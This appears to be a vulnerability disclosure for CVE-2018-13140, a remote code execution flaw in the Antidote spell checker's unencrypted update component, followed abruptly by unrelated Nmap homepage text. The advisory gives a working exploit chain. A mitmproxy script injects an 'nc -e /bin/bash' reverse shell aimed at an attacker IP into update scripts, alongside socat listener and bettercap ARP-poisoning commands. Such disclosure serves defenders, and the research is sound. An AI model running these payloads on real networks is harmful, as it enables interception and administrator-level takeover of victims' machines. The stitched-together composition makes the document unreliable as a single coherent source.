# [CVE-2018-13140] Antidote Remote Code Execution against the update
component

## Description

Antidote is a spell checker software for Windows, Linux macOS operating
system.

**Threat**

The application is affected by a remote code execution against the
update component. It leads to code execution with high privileges
against the targeted system.

**Expectation**

Network operations like an update component should be held through
encrypted communication channels like TLS, to prevent all sorts of
hijacking attacks.

## CVSS Score:

**CVE ID**: CVE-2018-13140

**Access Vector**: remote

**Security Risk**: high

**Vulnerability**: CWE-311

**CVSS Base Score**: 8.2

**CVSS Vector String**: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:H/A:L

# Details

Antidote downloads its installation packages over HTTP protocol, without
any kind of encryption such as TLS.

An attacker can thus perform a Man-In-The-Middle attack to intercept the
update request / response in order to replace or patch the downloaded
package.

Moreover, after the download is done, the component asks for
administrator rights to install the update, allowing thus an attacker to
run the payload as an administrator with privileged rights.

## Proof of Concept

We developed a simple `mitm-proxy` module to exploit this vulnerability,
here the python source code:

```
#(this script works best with --anticache)

from mitmproxy import http

MATCH = "export "
CMD_TO_INJECT = "nc -e /bin/bash IP_OF_ATTACKER 4444&"

class Injector:
    def response(self, flow: http.HTTPFlow) -> None:
        if MATCH.encode() in flow.response.content:
            print("Match detected")
            cmd = "\n%s\n%s" % (CMD_TO_INJECT, MATCH)
            flow.response.content =
flow.response.content.replace(MATCH.encode(),cmd.encode())

addons = [Injector()]
```

The previous script is looking for the `export ` string for each HTTP
responses, in order to replace it with a simple command to give the
attacker a remote reverse shell. Thereafter, when the update script is
called by the update software component, the simple command is firstly
run as a simple user. The update script asks then user for the
administrator password, allowing our command to be executed as
administrator.

In fact, we could thus obtain two remote shells (as simple user and
administrator), using a multithreaded listening TCP handler:

* The first one when the script is started (user privileges) ;

* The second one after the victim types his credentials (administrator
privileges).

The following commands are used to exploit the vulnerability, using a
Man-In-The-Middle attack:

* a multithreaded `socat` TCP listener, to receive the victim reverse
connection with low privileges against the target:

```
socat - TCP-LISTEN:4444,fork
```

* the mitm-proxy with our dedicated module:

```
mitmproxy -s antidote.py --anticache --listen-port 9090 -m transparent
```

* ARP Cache Poisoning using bettercap and redirecting traffic to mitm-proxy:

```
bettercap -I YOUR_NETWORK_INTERFACE -T VICTIM_IP_ADDRESS --custom-proxy
YOUR_IP_ADDRESS --custom-proxy-port 9090 -S ARP
```

When the Antidote software asks for an update, `mitmproxy` will
automatically patch the update component using our reverse shell payload
included.

After the end of the download, the user will press `install`, leading to
the execution of the two payloads, as described.

# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named âSecurity Product of the Yearâ by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

Nmap is ...

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmapÂ -vÂ -AÂ *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

Nmap users are encouraged to subscribe to the *Nmap-hackers*
mailing list. It is a low volume (6 posts in 2017), moderated list
for the most important announcements about Nmap, Insecure.org, and
related projects. You can join more than 128,000 current subscribers
by submitting your email address here:

(or subscribe with custom options from the [Nmap-hackers list info page](https://nmap.org/mailman/listinfo/announce))

We also have a development list for more hardcore members
(especially programmers) who are interested in helping the project by
helping with coding, testing, feature ideas, etc. New (test/beta)
versions of Nmap are sometimes released here prior to general
availability for QA purposes. You can subscribe at the [Nmap-dev list
info page](https://nmap.org/mailman/listinfo/dev).

Both lists are archived (along with many other security lists) at [Seclists.org](https://seclists.org).

Though it isn't nearly as active as the mailing lists, the official IRC channel is #nmap on [Freenode](http://freenode.net/) (irc.freenode.net).
